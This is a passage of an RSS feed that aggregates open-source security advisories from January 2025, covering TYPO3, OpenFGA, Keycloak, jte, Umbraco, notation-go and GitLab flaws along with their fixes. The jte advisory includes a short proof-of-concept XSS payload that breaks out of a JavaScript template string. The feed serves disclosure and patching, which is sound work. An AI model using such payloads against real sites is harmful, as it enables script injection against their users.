                    <title>GHSA-cjfr-9f5r-3q93: 4.3 | <b>TYPO3 Cross-Site Request Forgery in Log Module</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cjfr-9f5r-3q93</link>
                    <pubDate>2025-01-14T15:24:52Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cjfr-9f5r-3q93'>https://osv.dev/vulnerability/GHSA-cjfr-9f5r-3q93</a><br>
                            <b>Published:</b> 2025-01-14T15:24:52Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-cjfr-9f5r-3q93'>https://github.com/TYPO3/typo3/security/advisories/GHSA-cjfr-9f5r-3q93</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/belog/commit/ece08246dbcea416ff97d4cc013bf24fb622fe5f'>https://github.com/TYPO3-CMS/belog/commit/ece08246dbcea416ff97d4cc013bf24fb622fe5f</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/belog'>https://github.com/TYPO3-CMS/belog</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-003'>https://typo3.org/security/advisory/typo3-core-sa-2025-003</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Cross-Site Request Forgery in Log Module</b><br>### Problem
A vulnerability has been identified in the backend user interface functionality involving deep links. Specifically, this functionality is susceptible to Cross-Site Request Forgery (CSRF). Additionally, state-changing actions in downstream components incorrectly accepted submissions via HTTP GET and did not enforce the appropriate HTTP method.

Successful exploitation of this vulnerability requires the victim to have an active session on the backend user interface and to be deceived into interacting with a malicious URL targeting the backend, which can occur under the following conditions:

* the user opens a malicious link, such as one sent via email.
* the user visits a compromised or manipulated website while the following settings are misconfigured:
  + `security.backend.enforceReferrer` feature is disabled,
  + `BE&#x2F;cookieSameSite` configuration is set to `lax` or `none`

The vulnerability in the affected downstream component “Log Module” allows attackers to remove log entries.

### Solution
Update to TYPO3 versions 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Gabriel Dimitrov who reported this issue and to TYPO3 core and security members Benjamin Franzke, Oliver Hader, Andreas Kienast, Torben Hansen, Elias Häußler who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-003](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-003)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2fx5-pggv-6jjr: 4.8 | <b>TYPO3 Potential Open Redirect via Parsing Differences</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2fx5-pggv-6jjr</link>
                    <pubDate>2025-01-14T15:24:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2fx5-pggv-6jjr'>https://osv.dev/vulnerability/GHSA-2fx5-pggv-6jjr</a><br>
                            <b>Published:</b> 2025-01-14T15:24:20Z<br>
                            <b>Severity:</b> 4.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-2fx5-pggv-6jjr'>https://github.com/TYPO3/typo3/security/advisories/GHSA-2fx5-pggv-6jjr</a></li><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/commit/a4abf48d254685f43383e6e7f80d48aebaea56af'>https://github.com/TYPO3/typo3/commit/a4abf48d254685f43383e6e7f80d48aebaea56af</a></li><li>- <a target='_blank' href='https://github.com/TYPO3/typo3'>https://github.com/TYPO3/typo3</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-002'>https://typo3.org/security/advisory/typo3-core-sa-2025-002</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Potential Open Redirect via Parsing Differences</b><br>### Problem
Applications that use `TYPO3\CMS\Core\Http\Uri` to parse externally provided URLs (e.g., via a query parameter) and validate the host of the parsed URL may be vulnerable to open redirect or SSRF attacks if the URL is used after passing the validation checks.

### Solution
Update to TYPO3 versions 9.5.49 ELTS, 10.4.48 ELTS, 11.5.42 ELTS, 12.4.25 LTS, 13.4.3 LTS that fix the problem described.

### Credits
Thanks to Sam Mush and Christian Eßl who reported this issue and to TYPO3 core &amp; security team member Benjamin Franzke who fixed the issue.

### References
* [TYPO3-CORE-SA-2025-002](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-002)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-38x7-cc6w-j27q: 3.1 | <b>TYPO3 Information Disclosure via Exception Handling&#x2F;Logger</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-38x7-cc6w-j27q</link>
                    <pubDate>2025-01-14T15:23:41Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-38x7-cc6w-j27q'>https://osv.dev/vulnerability/GHSA-38x7-cc6w-j27q</a><br>
                            <b>Published:</b> 2025-01-14T15:23:41Z<br>
                            <b>Severity:</b> 3.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TYPO3/typo3/security/advisories/GHSA-38x7-cc6w-j27q'>https://github.com/TYPO3/typo3/security/advisories/GHSA-38x7-cc6w-j27q</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/install/commit/baa8089b1baf5552fab213a5761081608b0afc51'>https://github.com/TYPO3-CMS/install/commit/baa8089b1baf5552fab213a5761081608b0afc51</a></li><li>- <a target='_blank' href='https://github.com/TYPO3-CMS/install'>https://github.com/TYPO3-CMS/install</a></li><li>- <a target='_blank' href='https://typo3.org/security/advisory/typo3-core-sa-2025-001'>https://typo3.org/security/advisory/typo3-core-sa-2025-001</a></li></ul><br>
                            <b>Details:</b> <b>TYPO3 Information Disclosure via Exception Handling&#x2F;Logger</b><br>### Problem
It has been discovered that the install tool password has been logged as plaintext in case the password hashing mechanism used for the password was incorrect.

### Solution
Update to TYPO3 versions 13.4.3 LTS that fixes the problem described.

### Credits
Thanks to TYPO3 core &amp; security team member Oliver Hader who reported and fixed the issue.

### References
* [TYPO3-CORE-SA-2025-001](https:&#x2F;&#x2F;typo3.org&#x2F;security&#x2F;advisory&#x2F;typo3-core-sa-2025-001)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-32q6-rr98-cjqv: 5.8 | <b>OpenFGA Authorization Bypass</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-32q6-rr98-cjqv</link>
                    <pubDate>2025-01-13T19:59:24Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-32q6-rr98-cjqv'>https://osv.dev/vulnerability/GHSA-32q6-rr98-cjqv</a><br>
                            <b>Published:</b> 2025-01-13T19:59:24Z<br>
                            <b>Severity:</b> 5.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/openfga/openfga/security/advisories/GHSA-32q6-rr98-cjqv'>https://github.com/openfga/openfga/security/advisories/GHSA-32q6-rr98-cjqv</a></li><li>- <a target='_blank' href='https://github.com/openfga/openfga'>https://github.com/openfga/openfga</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3384'>https://pkg.go.dev/vuln/GO-2025-3384</a></li></ul><br>
                            <b>Details:</b> <b>OpenFGA Authorization Bypass</b><br>### Overview
OpenFGA v1.3.8 to v1.8.2 (Helm chart openfga-0.1.38 to openfga-0.2.19, docker v1.3.8 to v.1.8.2) are vulnerable to authorization bypass when certain Check and ListObject calls are executed.

### Am I Affected?
You are affected by this authorization bypass vulnerability if you are using OpenFGA v1.3.8 to v1.8.2, specifically under the following conditions: 
1. Calling Check API or ListObjects with a model that uses [conditions](https:&#x2F;&#x2F;openfga.dev&#x2F;docs&#x2F;modeling&#x2F;conditions), and 
2. OpenFGA is configured with caching enabled (`OPENFGA_CHECK_QUERY_CACHE_ENABLED`), and 
3. Check API call or ListObjects API calls contain [contextual tuples](https:&#x2F;&#x2F;openfga.dev&#x2F;docs&#x2F;concepts#what-are-contextual-tuples) that include conditions.

### Fix
Upgrade to v1.8.3. This upgrade is backwards compatible.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w3g8-r9gw-qrh8: 6.5 | <b>Denial of Service in Keycloak Server via Security Headers</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w3g8-r9gw-qrh8</link>
                    <pubDate>2025-01-13T16:58:23Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w3g8-r9gw-qrh8'>https://osv.dev/vulnerability/GHSA-w3g8-r9gw-qrh8</a><br>
                            <b>Published:</b> 2025-01-13T16:58:23Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/security/advisories/GHSA-w3g8-r9gw-qrh8'>https://github.com/keycloak/keycloak/security/advisories/GHSA-w3g8-r9gw-qrh8</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/commit/93b2a7327b2557eb132a8169086c5e63c81dff79'>https://github.com/keycloak/keycloak/commit/93b2a7327b2557eb132a8169086c5e63c81dff79</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0299'>https://access.redhat.com/errata/RHSA-2025:0299</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0300'>https://access.redhat.com/errata/RHSA-2025:0300</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-11734'>https://access.redhat.com/security/cve/CVE-2024-11734</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2328846'>https://bugzilla.redhat.com/show_bug.cgi?id=2328846</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak'>https://github.com/keycloak/keycloak</a></li></ul><br>
                            <b>Details:</b> <b>Denial of Service in Keycloak Server via Security Headers</b><br>A potential Denial of Service (DoS) vulnerability has been identified in Keycloak, which could allow an administrative user with the rights to change realm settings to disrupt the service. This is done by modifying any of the security headers and inserting newlines, which causes the Keycloak server to write to a request that is already terminated, leading to a failure of said request.

Service disruption may happen, users will be unable to access applications relying on Keycloak, or any of the consoles provided by Keycloak itself on the affected realm.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-f4v7-3mww-9gc2: 4.9 | <b>Keycloak allows unrestricted admin use of system and environment variables</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-f4v7-3mww-9gc2</link>
                    <pubDate>2025-01-13T16:58:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-f4v7-3mww-9gc2'>https://osv.dev/vulnerability/GHSA-f4v7-3mww-9gc2</a><br>
                            <b>Published:</b> 2025-01-13T16:58:08Z<br>
                            <b>Severity:</b> 4.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/security/advisories/GHSA-f4v7-3mww-9gc2'>https://github.com/keycloak/keycloak/security/advisories/GHSA-f4v7-3mww-9gc2</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/commit/7a76858fe4aa39a39fb6b86dd3d2c113d9c59854'>https://github.com/keycloak/keycloak/commit/7a76858fe4aa39a39fb6b86dd3d2c113d9c59854</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0299'>https://access.redhat.com/errata/RHSA-2025:0299</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0300'>https://access.redhat.com/errata/RHSA-2025:0300</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-11736'>https://access.redhat.com/security/cve/CVE-2024-11736</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2328850'>https://bugzilla.redhat.com/show_bug.cgi?id=2328850</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak'>https://github.com/keycloak/keycloak</a></li></ul><br>
                            <b>Details:</b> <b>Keycloak allows unrestricted admin use of system and environment variables</b><br>A security vulnerability has been identified that allows admin users to access sensitive server environment variables and system properties through user-configurable URLs. Specifically, when configuring backchannel logout URLs or admin URLs, admin users can include placeholders like ${env.VARNAME} or ${PROPNAME}. The server replaces these placeholders with the actual values of environment variables or system properties during URL processing.


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vh22-6c6h-rm8q: 6.1 | <b>jte&#x27;s HTML templates containing Javascript template strings are subject to XSS</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vh22-6c6h-rm8q</link>
                    <pubDate>2025-01-13T16:57:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vh22-6c6h-rm8q'>https://osv.dev/vulnerability/GHSA-vh22-6c6h-rm8q</a><br>
                            <b>Published:</b> 2025-01-13T16:57:59Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> java<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/casid/jte/security/advisories/GHSA-vh22-6c6h-rm8q'>https://github.com/casid/jte/security/advisories/GHSA-vh22-6c6h-rm8q</a></li><li>- <a target='_blank' href='https://github.com/casid/jte/commit/a6fb00d53c7b8dbb86de933215dbe1b9191a57f1'>https://github.com/casid/jte/commit/a6fb00d53c7b8dbb86de933215dbe1b9191a57f1</a></li><li>- <a target='_blank' href='https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#description'>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#description</a></li><li>- <a target='_blank' href='https://github.com/casid/jte'>https://github.com/casid/jte</a></li><li>- <a target='_blank' href='https://github.com/casid/jte/blob/main/jte-runtime/src/main/java/gg/jte/html/escape/Escape.java#L43-L83'>https://github.com/casid/jte/blob/main/jte-runtime/src/main/java/gg/jte/html/escape/Escape.java#L43-L83</a></li></ul><br>
                            <b>Details:</b> <b>jte&#x27;s HTML templates containing Javascript template strings are subject to XSS</b><br>### Summary
Jte HTML templates with `script` tags or script attributes that include a Javascript template string (backticks) are subject to XSS.

### Details
The `javaScriptBlock` and `javaScriptAttribute` methods in the `Escape` class ([source](https:&#x2F;&#x2F;github.com&#x2F;casid&#x2F;jte&#x2F;blob&#x2F;main&#x2F;jte-runtime&#x2F;src&#x2F;main&#x2F;java&#x2F;gg&#x2F;jte&#x2F;html&#x2F;escape&#x2F;Escape.java#L43-L83)) do not escape backticks, which are used for Javascript [template strings](https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;JavaScript&#x2F;Reference&#x2F;Template_literals#description). Dollar signs in template strings should also be escaped as well to prevent undesired interpolation.

### PoC
1. Use the [Jte Gradle Plugin](https:&#x2F;&#x2F;jte.gg&#x2F;gradle-plugin&#x2F;) with the following code in `src&#x2F;jte&#x2F;xss.jte`:
    ```html
    @param String someMessage
    &amp;lt;!DOCTYPE html&amp;gt;
    &amp;lt;html lang=&quot;en&quot;&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;title&amp;gt;XSS Test&amp;lt;&#x2F;title&amp;gt;
        &amp;lt;script&amp;gt;window.someVariable = `${someMessage}`;&amp;lt;&#x2F;script&amp;gt;
    &amp;lt;&#x2F;head&amp;gt;
    &amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;XSS Test&amp;lt;&#x2F;h1&amp;gt;
    &amp;lt;&#x2F;body&amp;gt;
    &amp;lt;&#x2F;html&amp;gt;
    ```
2. Use the following Java code to demonstrate the XSS vulnerability:
    ```java
    final StringOutput output = new StringOutput();
    JtexssGenerated.render(new OwaspHtmlTemplateOutput(output), null, &quot;` + alert(`xss`) + `&quot;);
    renderHtml(output);
    ```

### Impact
HTML templates rendered by Jte&#x27;s `OwaspHtmlTemplateOutput` in versions less than or equal to `3.1.15` with `script` tags or script attributes that contain Javascript template strings (backticks) are vulnerable.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mgr7-5782-6jh9: 0 | <b>The Umbraco Heartcore headless client library uses a vulnerable Refit dependency package</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mgr7-5782-6jh9</link>
                    <pubDate>2025-01-13T16:18:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mgr7-5782-6jh9'>https://osv.dev/vulnerability/GHSA-mgr7-5782-6jh9</a><br>
                            <b>Published:</b> 2025-01-13T16:18:39Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7'>https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco.Headless.Client.Net/security/advisories/GHSA-mgr7-5782-6jh9'>https://github.com/umbraco/Umbraco.Headless.Client.Net/security/advisories/GHSA-mgr7-5782-6jh9</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco.Headless.Client.Net'>https://github.com/umbraco/Umbraco.Headless.Client.Net</a></li></ul><br>
                            <b>Details:</b> <b>The Umbraco Heartcore headless client library uses a vulnerable Refit dependency package</b><br>### Impact
The Heartcore headless client library depends on [Refit ](https:&#x2F;&#x2F;github.com&#x2F;reactiveui&#x2F;refit) to assist in making HTTP requests to Heartcore public APIs. Refit recently published an advisory regarding a CRLF injection vulnerability whereby it is possible for a malicious user to smuggle additional headers or potentially body content into a request.

This shouldn&#x27;t affect Heartcore client library usage as the vulnerable method - `HttpHeaders.TryAddWithoutValidation` - is not used. However, since Refit is a transient dependency for applications using this library, then any users making direct use of Refit could be vulnerable.

### Patches
The vulnerable version of Refit has been upgraded to a secure version, as of Umbraco.Headless.Client.Net version 1.5.0, available on [Nuget](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Umbraco.Headless.Client.Net&#x2F;1.5.0).

### Workarounds
If calling Refit from your own code, set any necessary HTTP headers without use of `HttpHeaders.TryAddWithoutValidation`.

### References
See the [original Refit advisory](https:&#x2F;&#x2F;github.com&#x2F;reactiveui&#x2F;refit&#x2F;security&#x2F;advisories&#x2F;GHSA-3hxg-fxwm-8gf7) for further info.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-45v3-38pc-874v: 4.0 | <b>notation-go&#x27;s timestamp signature generation lacks certificate revocation check</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-45v3-38pc-874v</link>
                    <pubDate>2025-01-13T16:14:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-45v3-38pc-874v'>https://osv.dev/vulnerability/GHSA-45v3-38pc-874v</a><br>
                            <b>Published:</b> 2025-01-13T16:14:07Z<br>
                            <b>Severity:</b> 4.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go/security/advisories/GHSA-45v3-38pc-874v'>https://github.com/notaryproject/notation-go/security/advisories/GHSA-45v3-38pc-874v</a></li><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go/commit/e7005a6d13e5ba472d4e166fbb085152f909e102'>https://github.com/notaryproject/notation-go/commit/e7005a6d13e5ba472d4e166fbb085152f909e102</a></li><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go/commit/e99be1954a15673020150c5f8800b8174cd7428d'>https://github.com/notaryproject/notation-go/commit/e99be1954a15673020150c5f8800b8174cd7428d</a></li><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go'>https://github.com/notaryproject/notation-go</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3381'>https://pkg.go.dev/vuln/GO-2025-3381</a></li></ul><br>
                            <b>Details:</b> <b>notation-go&#x27;s timestamp signature generation lacks certificate revocation check</b><br>This issue was identified during Quarkslab&#x27;s audit of the timestamp feature.

### Summary
During the timestamp signature generation, the revocation status of the certificate(s) used to generate the timestamp signature was not verified.

### Details
During timestamp signature generation, notation-go did not check the revocation status of the certificate chain used by the TSA. This oversight creates a vulnerability that could be exploited through a Man-in-The-Middle attack. An attacker could potentially use a compromised, intermediate, or revoked leaf certificate to generate a malicious countersignature, which would then be accepted and stored by `notation`.

### Impact
This could lead to denial of service scenarios, particularly in CI&#x2F;CD environments during signature verification processes because timestamp signature would fail due to the presence of a revoked certificate(s) potentially disrupting operations.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qjh3-4j3h-vmwp: 3.3 | <b>notation-go has an OS error when setting CRL cache leads to denial of signature verification</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qjh3-4j3h-vmwp</link>
                    <pubDate>2025-01-13T16:13:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qjh3-4j3h-vmwp'>https://osv.dev/vulnerability/GHSA-qjh3-4j3h-vmwp</a><br>
                            <b>Published:</b> 2025-01-13T16:13:59Z<br>
                            <b>Severity:</b> 3.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go/security/advisories/GHSA-qjh3-4j3h-vmwp'>https://github.com/notaryproject/notation-go/security/advisories/GHSA-qjh3-4j3h-vmwp</a></li><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go/commit/3c3302258ad510fbca2f8a73731569d91f07d196'>https://github.com/notaryproject/notation-go/commit/3c3302258ad510fbca2f8a73731569d91f07d196</a></li><li>- <a target='_blank' href='https://github.com/notaryproject/notation-go'>https://github.com/notaryproject/notation-go</a></li><li>- <a target='_blank' href='https://man7.org/linux/man-pages/man2/rename.2.html'>https://man7.org/linux/man-pages/man2/rename.2.html</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3382'>https://pkg.go.dev/vuln/GO-2025-3382</a></li></ul><br>
                            <b>Details:</b> <b>notation-go has an OS error when setting CRL cache leads to denial of signature verification</b><br>### Summary
The issue was identified during Quarkslab&#x27;s security audit on the Certificate Revocation List (CRL) based revocation check feature.
After retrieving the CRL, notation-go attempts to update the CRL cache using the os.Rename method. However, this operation may fail due to operating system-specific limitations, particularly when the source and destination paths are on different mount points. This failure could lead to an unexpected program termination.

### Details

In method `crl.(*FileCache).Set`, a temporary file is created in the OS dedicated area (like &#x2F;tmp for, usually, Linux&#x2F;Unix). The file is written and then it is tried to move it to the dedicated `notation` cache directory thanks `os.Rename`. As specified in Go documentation, OS specific restriction may apply. When used with Linux OS, it is relying on `rename` syscall from the libc and as per the [documentation](https:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;rename.2.html), moving a file to a different mountpoint raises an `EXDEV` error, interpreted as `Cross device link not permitted error`.
Some Linux distribution, like `RedHat` use a dedicated filesystem (`tmpfs`), mounted on a specific mountpoint (usually `&#x2F;tmp`) for temporary files. When using such OS, revocation check based on CRL will repeatedly crash `notation`. 

### PoC
1. Ensure that the temporary file storage area (e.g., &#x2F;tmp) is mounted on a different mount point than the user&#x27;s &#x27;notation&#x27; cache directory.
2. Either disable the Online Certificate Status Protocol (OCSP) revocation check, or utilize certificates that exclusively support Certificate Revocation Lists (CRLs) for revocation check.
3. Try to verify a previously generated signature using the &#x27;notation&#x27; tool.

### Impact
The signature verification process is aborted as process crashes.

### Remediation
The cache file should be created, written, then copied to the wanted final location, and finally removed. Additionally, this error shouldn&#x27;t lead to a crash as it is not fatal and shouldn&#x27;t prevent the rest of the program to properly continue

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-12431: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-12431</link>
                    <pubDate>2025-01-10T19:24:59.289Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-12431'>https://osv.dev/vulnerability/BIT-gitlab-2024-12431</a><br>
                            <b>Published:</b> 2025-01-10T19:24:59.289Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#unauthorized-user-can-manipulate-status-of-issues-in-public-projects'>https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#unauthorized-user-can-manipulate-status-of-issues-in-public-projects</a></li><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/508742'>https://gitlab.com/gitlab-org/gitlab/-/issues/508742</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2877710'>https://hackerone.com/reports/2877710</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions starting from 15.5 before 17.5.5, 17.6 before 17.6.3, and 17.7 before 17.7.1, in which unauthorized users could manipulate the status of issues in public projects.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-13041: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-13041</link>
                    <pubDate>2025-01-10T19:24:39.902Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-13041'>https://osv.dev/vulnerability/BIT-gitlab-2024-13041</a><br>
                            <b>Published:</b> 2025-01-10T19:24:39.902Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#instance-saml-does-not-respect-external_provider-configuration'>https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#instance-saml-does-not-respect-external_provider-configuration</a></li><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/479165'>https://gitlab.com/gitlab-org/gitlab/-/issues/479165</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions starting from 16.4 prior to 17.5.5, starting from 17.6 prior to 17.6.3, and starting from 17.7 prior to 17.7.1. When a user is created via the SAML provider, the external groups setting overrides the external provider configuration. As a result, the user may not be marked as external thereby giving those users access to internal projects or groups.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-6324: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-6324</link>
                    <pubDate>2025-01-10T19:17:23.895Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-6324'>https://osv.dev/vulnerability/BIT-gitlab-2024-6324</a><br>
                            <b>Published:</b> 2025-01-10T19:17:23.895Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#cyclic-reference-of-epics-leads-resource-exhaustion'>https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#cyclic-reference-of-epics-leads-resource-exhaustion</a></li><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/468914'>https://gitlab.com/gitlab-org/gitlab/-/issues/468914</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2553716'>https://hackerone.com/reports/2553716</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions starting from 15.7 prior to 17.5.5, starting from 17.6 prior to 17.6.3, and starting from 17.7 prior to 17.7.1. It was possible to trigger a DoS by creating cyclic references between epics.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2025-0194: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2025-0194</link>
                    <pubDate>2025-01-10T19:11:23.175Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2025-0194'>https://osv.dev/vulnerability/BIT-gitlab-2025-0194</a><br>
                            <b>Published:</b> 2025-01-10T19:11:23.175Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#possible-access-token-exposure-in-gitlab-logs'>https://about.gitlab.com/releases/2025/01/08/patch-release-gitlab-17-7-1-released/#possible-access-token-exposure-in-gitlab-logs</a></li><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/489459'>https://gitlab.com/gitlab-org/gitlab/-/issues/489459</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions starting from 17.4 prior to 17.5.5, starting from 17.6 prior to 17.6.3, and starting from 17.7 prior to 17.7.1. Under certain conditions, access tokens may have been logged when API requests were made in a specific manner.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-25371: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-25371</link>
                    <pubDate>2025-01-10T16:15:28Z</pubDate>
                    <description>
                        <![CDATA[
